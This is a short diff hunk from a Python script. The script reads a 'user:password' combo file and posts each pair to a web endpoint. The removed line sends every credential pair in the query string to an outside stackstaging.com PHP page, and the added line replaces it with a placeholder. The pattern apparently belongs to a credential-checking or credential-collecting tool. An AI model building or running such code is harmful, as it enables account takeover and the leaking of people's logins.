@@ -11,7 +11,7 @@ var = open(combo, 'r').readlines()
 for line in var:
 	combo = line.strip()
 	user, pas =line.split(":")
-	url = 'http://ahmed-gad-for-dev-com.stackstaging.com/gad.php?u='+user+'&p='+pas+''
+	url = 'api'
 	http = requests.post(url)
 	content = http.content
 	data = json.loads(content.decode("utf-8"))
